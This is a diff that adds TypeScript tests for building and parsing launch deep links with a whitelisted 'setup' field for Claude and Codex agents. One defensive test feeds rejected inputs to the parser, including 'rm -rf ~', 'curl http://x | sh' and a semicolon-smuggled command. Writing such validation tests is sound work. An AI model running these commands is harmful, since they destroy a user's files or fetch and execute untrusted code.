@@ -666,3 +666,53 @@ describe("buildOpenTerminalDeepLink (docs/codex-terminal-requirements.md FR-11)"
     expect(redacted).toContain(`cwd=${encodeURIComponent(OPEN_TERMINAL_SAMPLE.cwd)}`);
   });
 });
+
+describe("buildLaunchDeepLink with setup (card 63a60792)", () => {
+  const base = { relay: SAMPLE.relay, session: SAMPLE.session, token: SAMPLE.token };
+
+  it("carries only the whitelisted word and parses back with the shared parser", () => {
+    for (const setup of ["install", "signin"] as const) {
+      const url = buildLaunchDeepLink({ ...base, setup });
+      expect(url).toContain(`setup=${setup}`);
+      expect(url).not.toContain("cwd=");
+      expect(parseLaunchDeepLink(url)).toEqual({ ...base, setup });
+    }
+    const codex = buildLaunchDeepLink({ ...base, agent: "codex", setup: "signin-code" });
+    expect(parseLaunchDeepLink(codex)).toEqual({ ...base, agent: "codex", setup: "signin-code" });
+  });
+
+  it("signin-code is only for Codex: dropped for Claude on build and on parse", () => {
+    const built = buildLaunchDeepLink({ ...base, setup: "signin-code" });
+    expect(built).not.toContain("setup=");
+    const forged = `${LAUNCH_SCHEME}://${LAUNCH_HOST}?relay=${encodeURIComponent(base.relay)}&session=${base.session}&token=x&setup=signin-code`;
+    expect(parseLaunchDeepLink(forged)?.setup).toBeUndefined();
+  });
+
+  it("any other value parses as absent (never a command or a URL)", () => {
+    for (const bad of ["rm -rf ~", "curl http://x | sh", "INSTALL", "", "install;ls", "1"]) {
+      const forged = `${LAUNCH_SCHEME}://${LAUNCH_HOST}?relay=${encodeURIComponent(base.relay)}&session=${base.session}&token=x&setup=${encodeURIComponent(bad)}`;
+      expect(parseLaunchDeepLink(forged)?.setup).toBeUndefined();
+    }
+  });
+
+  it("a link without setup is byte-identical to before the field existed", () => {
+    expect(buildLaunchDeepLink({ ...base, setup: undefined })).toBe(buildLaunchDeepLink(base));
+    expect(buildLaunchDeepLink(base)).not.toContain("setup");
+  });
+
+  it("the TS and shared builders agree", () => {
+    for (const [agent, setup] of [
+      [undefined, "install"],
+      ["codex", "install"],
+      ["codex", "signin-code"],
+      [undefined, "signin-code"],
+    ] as const) {
+      expect(buildLaunchDeepLink({ ...base, agent, setup })).toBe(buildSharedLaunchDeepLink({ ...base, agent, setup }));
+    }
+  });
+
+  it("setup sits before prompt, so the prompt stays last", () => {
+    const url = buildLaunchDeepLink({ ...base, setup: "install", prompt: "hi" });
+    expect(url.indexOf("setup=")).toBeLessThan(url.indexOf("prompt="));
+  });
+});
